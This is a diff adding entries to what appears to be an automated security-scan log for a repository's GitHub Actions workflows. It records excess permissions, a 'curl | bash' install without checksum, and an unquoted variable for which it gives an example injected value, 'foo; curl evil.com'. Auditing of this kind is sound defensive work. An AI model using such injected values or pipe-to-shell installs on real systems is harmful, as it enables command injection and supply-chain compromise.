@@ -73,3 +73,23 @@ TARGET_ORG not configured for betpanda; skipping public-org deep scan.
 TARGET_ORG not configured for betpanda; skipping public-org deep scan.
 ## REPOSCAN 2026-09-06 21:24:08 UTC
 TARGET_ORG not configured for betpanda; skipping public-org deep scan.
+## REPOSCAN 2026-09-06 23:07:46 UTC
+class: OTHER
+asset: `.github/workflows/hunt.yml`
+confidence: 90
+reasoning: `hunt.yml` declares `contents: write` and `actions: write` (line 9-10). The workflow reads files, runs analysis, and pushes commits — `actions: write` is unused and unnecessary, violating least-privilege. `reposcan.yml` also declares `contents: write` (line 9) but the script only reads public repos via unauthenticated API.
+impact: Low — expanded blast radius if workflow is compromised; not directly exploitable.
+verify_steps: Inspect `permissions:` blocks in `.github/workflows/hunt.yml:8-10` and `.github/workflows/reposcan.yml:8-9`.
+class: OTHER
+asset: `.github/workflows/hunt.yml:46`, `.github/workflows/reposcan.yml:35`
+confidence: 85
+reasoning: Both workflows install opencode via `curl -fsSL https://opencode.ai/install | bash` (with retry logic). This pipes a remote script directly into bash without checksum verification, a known supply-chain risk pattern. In a GitHub Actions context the risk is mitigated by the runner being ephemeral.
+impact: Low — supply-chain risk if opencode.ai is compromised; runner is ephemeral.
+verify_steps: Confirm lines `hunt.yml:46` and `reposcan.yml:35` execute `curl ... | bash`.
+class: OTHER
+asset: `.github/workflows/reposcan.yml:50-52`
+confidence: 70
+reasoning: `$TARGET_ORG` is expanded unquoted in `for ORG in $TARGET_ORG` and interpolated into a curl URL (`https://api.github.com/orgs/$ORG/repos`). Currently `TARGET_ORG=""` (line 13), so this code path is dead. If someone sets `TARGET_ORG` to a value containing shell metacharacters (e.g., `foo; curl evil.com`), it could lead to command injection via the unquoted variable in the `for` loop and the curl URL.
+impact: Low — `TARGET_ORG` is hardcoded empty in the repo; only exploitable if a contributor modifies it unsafely.
+verify_steps: Check `reposcan.yml:13` (`TARGET_ORG: ""`) and `reposcan.yml:50-52` (unquoted expansion).
+TARGET_ORG not configured for betpanda; skipping public-org deep scan.
